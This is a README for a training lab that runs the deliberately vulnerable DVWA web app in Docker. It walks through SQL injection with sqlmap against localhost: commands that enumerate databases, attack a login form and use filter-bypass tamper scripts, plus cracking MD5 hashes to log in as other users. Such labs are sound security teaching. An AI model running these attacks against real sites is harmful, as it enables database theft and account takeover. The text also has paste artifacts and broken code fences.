# DVWA SQL Injection Lab

This repository provides a beginner-friendly walkthrough of setting up and exploiting **DVWA (Damn Vulnerable Web App)** using **SQLMap** for SQL injection testing.

## 🔧 Setup

### 1. Clone the Repository:
```bash
git clone https://github.com/abdmusleh/dvwa-sqlmap-lab.git
cd dvwa-sqlmap-lab
2. Start the Lab with Docker:
bash
Copy
Edit
docker-compose up -d
3. Access DVWA:
Open your browser and navigate to http://localhost:8080 to access DVWA.

🧠 What You’ll Learn
How to perform SQL injections using sqlmap.

Cracking MD5 hashes retrieved from the database.

Bypassing authentication by exploiting SQL vulnerabilities.

How to use sqlmap tamper scripts and advanced options.

🚀 Quick Start
Clone the repository and start the environment with Docker:

bash
Copy
Edit
git clone https://github.com/abdmusleh/dvwa-sqlmap-lab.git
cd dvwa-sqlmap-lab
docker-compose up -d
Log in to DVWA as different users using the cracked passwords (for example, admin:password).

Run sqlmap to test for SQL injection:

bash
Copy
Edit
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=your-session-id" --batch --banner
Retrieve database details:

bash
Copy
Edit
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=your-session-id" --batch --dbs
Crack MD5 hashes using tools like John the Ripper or online MD5 hash crack sites.

📂 Folder Structure
docker-compose.yml: The file to automatically set up DVWA and MySQL in Docker.

README.md: This file with all instructions.

exploits/: A folder for custom payloads or scripts.

🎯 Further Exploration
Explore advanced SQL injection attacks and tamper scripts.

Experiment with different security levels in DVWA.

Learn about other vulnerabilities such as XSS, CSRF, etc., in DVWA.

⚠️ Important: Responsible Use
This lab environment is intended for educational purposes only. Never use these techniques on unauthorized systems.

yaml
Copy
Edit

---

### **Optional Additions:**
If you want to add an additional file with `sqlmap` examples, you can create a `sqlmap_payloads.md` file:

```markdown
# SQLMap Payloads

## Basic GET Request

To test for SQL Injection vulnerabilities, use the following SQLMap command for GET requests:

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your-session-id" --batch --dbs
POST Request (Login Example)
For POST requests, use the --data option:

bash
Copy
Edit
sqlmap -u "http://localhost/DVWA/index.php" --data="username=admin&password=123456&login=login" --cookie="PHPSESSID=your-session-id" --batch --risk=3 --level=5 --dbs
Using Tamper Scripts
You can also use tamper scripts to bypass security filters:

bash
Copy
Edit
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your-session-id" --tamper=space2comment --batch --dbs
yaml
Copy
Edit

---

### **Steps to Save and Commit**:
1. **Save your README** and `sqlmap_payloads.md` file after editing.
2. **Commit the changes**:
   ```bash
   git add README.md
   git add sqlmap_payloads.md  # If you created this additional file
   git commit -m "Added detailed instructions and SQLMap payloads"
